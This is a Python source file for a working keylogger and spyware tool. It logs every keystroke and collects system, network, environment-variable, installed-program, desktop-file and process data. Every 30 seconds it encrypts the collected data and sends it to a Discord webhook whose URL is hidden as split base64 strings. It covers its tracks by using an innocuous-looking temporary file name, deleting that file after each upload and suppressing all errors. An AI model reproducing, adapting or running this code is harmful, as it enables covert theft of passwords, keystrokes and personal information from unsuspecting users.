import os
import socket
import subprocess
from sys import platform
import pynput.keyboard
import threading
import time
import platform
import requests
import base64
import crypto_module
import psutil
import uuid


key6 = 'put half of you discord server key here'
key7 = 'and the second half here'
output_file = "notsusatall.txt"

key_logs = []
system_info_sent = False

def on_press(key):
    global key_logs
    try:
        # Log regular characters
        key_logs.append(key.char)
    except AttributeError:
        # Log special keys
        key_logs.append(f' [{key.name}] ')

def get_system_info():
    info = []
    info.append("============ SYSTEM RECON =============")
    info.append("\n----------Computer and User Information----------")
    try: # Get basic system info
        info.append(f"User: {os.getenv('USERNAME')}")
        info.append(f"Computer Name: {os.getenv('COMPUTERNAME')}")
        info.append(f"OS: {platform.system()} {platform.release()} (version {platform.version()})")
        info.append(f"Hostname: {socket.gethostname()}")
    except: pass

    try: # Get computer info
        info.append(f"Processor: {platform.processor()}")
        info.append(f"Machine: {platform.machine()}")
        info.append(f"RAM: {round(psutil.virtual_memory().total / (1024**3))} GB")

        cpu_name = subprocess.check_output('wmic cpu get name', shell=True).decode().strip().split('\n')[1]
        info.append(f"CPU: {cpu_name}")

        gpu_info = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().strip().split('\n')
        gpus = [line.strip() for line in gpu_info if line.strip() and "Name" not in line]
        info.append(f"GPU(s): {', '.join(gpus)}")
    except: pass

    try: # Get MAC Address
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) 
                        for ele in range(0,8*6,8)][::-1])
        info.append(f"MAC Address: {mac}")
    except Exception as e:
        info.append(f"MAC Address: Unavailable {e}")

    info.append("\n---------- Network Information ----------")

    try: # Get local IP
        local_ip = socket.gethostbyname(socket.gethostname())
        info.append(f"Local IP: {local_ip}")
    except Exception as e:
        info.append("Local IP: Unavailable {e}")   

    try: # Get public IP
        ip = requests.get('https://api.ipify.org',timeout=3).text
        info.append(f"Public IP: {ip}")
    except: info.append("Public IP: Unavailable")

    try: # Get active network connections
        connections = subprocess.check_output('netstat -n', shell=True).decode('latin-1', errors='ignore')
        info.append("------ Active Network Connections ------")
        info.append(connections[:1500] + " .....")  # Limit to first 1500 chars
    except: pass

    info.append("\n---------- Computer programs and files ----------")

    try: # environment variables
        env_vars = dict(os.environ)
        info.append("\n------ Environment Variables ------")
        for key in list(env_vars.keys())[:10]:  # Limit to first 10 env vars
            info.append(f"{key}: {env_vars[key]}")
    except: pass

    try: # Installed programs (Windows)
        if platform.system() == "Windows":
            ps_cmd = 'powershell "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName"'
            output = subprocess.check_output(ps_cmd, shell=True).decode('latin-1', errors='ignore')
            programs = [line.strip() for line in output.split('\n') if line.strip() and "DisplayName" not in line]
            programs.sort()
            
            info.append("\n------ Installed Programs (PowerShell) ------")
            info.append(', '.join(programs[:20]) + " ...") # Limit to first 20 programs
    except: pass
        

    try: # Desktop files
        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        files = os.listdir(desktop_path)
        files_only = [f for f in files if os.path.isfile(os.path.join(desktop_path, f))]
        info.append("\n------ Desktop Files ------")
        info.append(f"Desktop Files: {', '.join(files_only[:10])} {'...' if len(files_only) > 10 else ''}")
    except: pass


    info.append("\n----------Top Processes----------")
    try: # List top running processes
        tasks = subprocess.check_output('tasklist', shell=True).decode('latin-1', errors='ignore')
        info.append(tasks[:1500]+" .....")  # Limit to first 1500 chars

    except: info.append("Could not retrieve processes.")

    info.append("============= END OF RECON ===============\n\n")
    return "\n".join(info)


def extract_data():
    webhook_url = base64.b64decode(key6 + key7).decode('utf-8')

    global key_logs , system_info_sent
    if not key_logs and system_info_sent:
        return
    
    data_string = ""
    if not system_info_sent:
        sys_info = get_system_info()
        data_string += sys_info
        system_info_sent = True

    data_string += "====== KEYLOGS ======\n"
    if key_logs:
        data_string += "".join(key_logs)
        data_string += "\n====== END OF KEYLOGS ======\n"


    data_to_encrypt = data_string.encode('utf-8')
    encrypted_data = crypto_module.encrypt_data(data_to_encrypt)

    try:
        with open(output_file, 'wb') as f:
            f.write(encrypted_data)

        with open(output_file, 'rb') as f:
            files = {'file': (output_file, f)}
            payload = {"content": f"📢 REPORT: {os.getenv('USERNAME')} | IP Captured."}
            requests.post(webhook_url, data=payload, files=files)
    
    except Exception as e:
        pass # Silently ignore any exceptions

    finally:
        if os.path.exists(output_file): #delete the file after sending
            os.remove(output_file)
        key_logs = []  # Clear logs after sending   


def start_keylogger():

    def background_task():
        listener = pynput.keyboard.Listener(on_press=on_press)
        listener.start()
        time.sleep(1)  # Initial delay to send system info
        extract_data()

        while True:
            time.sleep(30)  # Wait for 30 seconds
            extract_data()

    thread = threading.Thread(target=background_task, daemon=True)
    thread.start()
